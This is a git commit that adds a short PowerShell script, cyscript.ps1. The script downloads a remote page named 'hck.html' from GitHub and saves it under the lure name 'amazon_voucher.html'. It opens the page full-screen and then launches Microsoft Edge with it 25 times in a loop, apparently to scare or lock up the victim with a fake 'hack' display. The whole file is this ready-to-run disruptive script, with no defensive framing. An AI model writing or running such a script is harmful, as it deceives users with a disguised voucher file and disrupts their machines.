176f38f843e8da6299a46edd5e074d66483bc120
vishwks22 <kontactvishwa@rediffmail.com>
2025-10-22 21:39:30 +0530

    ps1
    ps1

---
+++ cyscript.ps1
@@ -0,0 +1,10 @@
+﻿powershell -Command "invoke-webrequest 'https://raw.githubusercontent.com/vishwks22/cyscript/refs/heads/main/hck.html' -Outfile '.\Downloads\amazon_voucher.html'"
+Start-Process "$([Environment]::GetFolderPath('UserProfile'))\Downloads\amazon_voucher.html" --start-fullscreen
+sleep 5
+$urls = @("$([Environment]::GetFolderPath('UserProfile'))\Downloads\amazon_voucher.html")
+#$urls = @("https://bing.com", "https://google.com", "https://stackoverflow.com")
+$i = 1
+while ($i -le 25) {
+    Start-Process "msedge.exe" -ArgumentList $urls
+    $i++
+}
